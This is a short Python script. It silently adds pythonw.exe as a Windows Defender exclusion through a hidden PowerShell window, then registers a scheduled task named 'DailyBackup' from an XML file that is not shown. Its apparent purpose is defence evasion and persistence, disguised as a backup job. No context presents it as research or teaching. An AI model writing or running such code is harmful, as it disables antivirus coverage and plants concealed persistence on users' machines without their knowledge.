import subprocess
subprocess.run(["powershell", "-Command", "Add-MpPreference -ExclusionProcess 'pythonw.exe'"], creationflags=0x08000000)
subprocess.run(["schtasks", "/Create", "/TN", "DailyBackup", "/XML", "backup.xml"])
